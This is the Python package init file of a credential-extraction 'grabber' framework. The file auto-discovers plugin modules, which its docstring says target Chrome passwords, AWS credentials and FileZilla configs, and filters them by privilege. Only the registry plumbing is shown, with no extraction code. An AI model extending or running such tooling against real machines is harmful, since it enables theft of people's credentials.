"""
GRABBER MODULES — Credential extraction beyond file discovery

This package provides the plugin framework for credential extraction modules.
Each module targets a specific application or data store (Chrome passwords,
AWS credentials, FileZilla configs, etc.) and knows how to parse/decrypt
the credential data within.

Modules are auto-discovered: drop a .py file in this directory with a class
inheriting GrabberModule and it will be picked up by GrabberRegistry.
"""

from __future__ import annotations

import importlib
import logging
import pkgutil
from typing import TYPE_CHECKING

from .base import GrabberContext, GrabberModule, check_admin
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel

if TYPE_CHECKING:
    pass

logger = logging.getLogger(__name__)

# Internal modules that are not grabbers (skip during discovery)
_SKIP_MODULES = frozenset({"base", "models", "utils"})


class GrabberRegistry:
    """Discovers and manages grabber modules via auto-discovery."""

    def __init__(self) -> None:
        self._module_classes: dict[str, type[GrabberModule]] = {}
        self._discovered = False

    def discover(self) -> None:
        """Auto-discover all GrabberModule subclasses in this package."""
        if self._discovered:
            return

        for _importer, modname, _ispkg in pkgutil.iter_modules(__path__):
            if modname.startswith("_") or modname in _SKIP_MODULES:
                continue
            try:
                module = importlib.import_module(f".{modname}", __package__)
                for attr_name in dir(module):
                    attr = getattr(module, attr_name)
                    if (
                        isinstance(attr, type)
                        and issubclass(attr, GrabberModule)
                        and attr is not GrabberModule
                        and getattr(attr, "name", "")
                    ):
                        self._module_classes[attr.name] = attr
            except Exception as e:
                logger.debug(f"Failed to import grabber module {modname}: {e}")

        self._discovered = True
        logger.info(f"Discovered {len(self._module_classes)} grabber modules")

    def get_all_modules(self) -> list[GrabberModule]:
        """Return instantiated instances of all discovered modules."""
        self.discover()
        return [cls() for cls in self._module_classes.values()]

    def get_enabled_modules(
        self,
        context: GrabberContext,
        enabled_names: list[str] | None = None,
    ) -> list[GrabberModule]:
        """Return modules that should run in this context.

        Args:
            context: Current grabber context (used for platform/privilege checks)
            enabled_names: If provided, only include modules with these names.
                          If None, include all default_enabled modules.
        """
        self.discover()
        modules = []

        for name, cls in self._module_classes.items():
            if enabled_names is not None and name not in enabled_names:
                continue
            if enabled_names is None and not cls.default_enabled:
                continue

            instance = cls()
            can_run, reason = instance.can_run(context)
            if can_run:
                modules.append(instance)
            else:
                logger.debug(f"Skipping grabber {name}: {reason}")

        return modules

    @property
    def available_names(self) -> list[str]:
        """List names of all discovered modules."""
        self.discover()
        return sorted(self._module_classes.keys())


__all__ = [
    "GrabberModule",
    "GrabberContext",
    "GrabberRegistry",
    "GrabberResult",
    "GrabberStatus",
    "ExtractedCredential",
    "PrivilegeLevel",
    "check_admin",
]
